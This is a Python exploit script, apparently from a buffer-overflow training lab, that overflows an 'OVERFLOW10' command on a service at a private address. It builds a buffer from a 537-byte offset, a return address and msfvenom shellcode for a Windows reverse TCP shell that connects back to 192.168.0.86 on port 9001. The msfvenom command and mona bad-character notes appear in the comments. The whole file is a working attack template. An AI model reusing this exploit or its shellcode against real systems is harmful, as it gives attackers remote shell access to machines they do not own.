#!/usr/bin/env python3
import socket

ip = "192.168.0.87"
port = 1337

# Add bad chars here after first iteration of finding bad chars
# Then re-generate bytearray with the bad chars removed using mona
remove_badchars_from_badchars = "\x00\xa0\xad\xbe\xde\xef"
badchars = "".join([chr(int(hex(x),16)) for x in range(1,256)])
for char in remove_badchars_from_badchars:
    badchars = badchars.replace(char, "")

prefix = "OVERFLOW10 "
offset = 537
overflow = "A" * offset
retn = "\xaf\x11\x50\x62" # \x03\x12\x50\x62 \xaf\x11\x50\x62
padding = "\x90" * 0

# Badchars: \x00\xa0\xad\xbe\xde\xef
# Payload: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.86 LPORT=9001 EXITFUNC=thread -f c -b "\x00\xa0\xad\xbe\xde\xef"
payload = (
"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\x60\xa6\x4c\x13\x83\xee\xfc\xe2\xf4\x9c\x4e\xce\x13"
"\x60\xa6\x2c\x9a\x85\x97\x8c\x77\xeb\xf6\x7c\x98\x32\xaa"
"\xc7\x41\x74\x2d\x3e\x3b\x6f\x11\x06\x35\x51\x59\xe0\x2f"
"\x01\xda\x4e\x3f\x40\x67\x83\x1e\x61\x61\xae\xe1\x32\xf1"
"\xc7\x41\x70\x2d\x06\x2f\xeb\xea\x5d\x6b\x83\xee\x4d\xc2"
"\x31\x2d\x15\x33\x61\x75\xc7\x5a\x78\x45\x76\x5a\xeb\x92"
"\xc7\x12\xb6\x97\xb3\xbf\xa1\x69\x41\x12\xa7\x9e\xac\x66"
"\x96\xa5\x31\xeb\x5b\xdb\x68\x66\x84\xfe\xc7\x4b\x44\xa7"
"\x9f\x75\xeb\xaa\x07\x98\x38\xba\x4d\xc0\xeb\xa2\xc7\x12"
"\xb0\x2f\x08\x37\x44\xfd\x17\x72\x39\xfc\x1d\xec\x80\xf9"
"\x13\x49\xeb\xb4\xa7\x9e\x3d\xce\x7f\x21\x60\xa6\x24\x64"
"\x13\x94\x13\x47\x08\xea\x3b\x35\x67\x59\x99\xab\xf0\xa7"
"\x4c\x13\x49\x62\x18\x43\x08\x8f\xcc\x78\x60\x59\x99\x43"
"\x30\xf6\x1c\x53\x30\xe6\x1c\x7b\x8a\xa9\x93\xf3\x9f\x73"
"\xdb\x79\x65\xce\x8c\xbb\x60\xf0\x24\x11\x60\x85\x65\x9a"
"\x86\xcc\x5c\x45\x37\xce\xd5\xb6\x14\xc7\xb3\xc6\xe5\x66"
"\x38\x1f\x9f\xe8\x44\x66\x8c\xce\xbc\xa6\xc2\xf0\xb3\xc6"
"\x08\xc5\x21\x77\x60\x2f\xaf\x44\x37\xf1\x7d\xe5\x0a\xb4"
"\x15\x45\x82\x5b\x2a\xd4\x24\x82\x70\x12\x61\x2b\x08\x37"
"\x70\x60\x4c\x57\x34\xf6\x1a\x45\x36\xe0\x1a\x5d\x36\xf0"
"\x1f\x45\x08\xdf\x80\x2c\xe6\x59\x99\x9a\x80\xe8\x1a\x55"
"\x9f\x96\x24\x1b\xe7\xbb\x2c\xec\xb5\x1d\xac\x0e\x4a\xac"
"\x24\xb5\xf5\x1b\xd1\xec\xb5\x9a\x4a\x6f\x6a\x26\xb7\xf3"
"\x15\xa3\xf7\x54\x73\xd4\x23\x79\x60\xf5\xb3\xc6"
)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")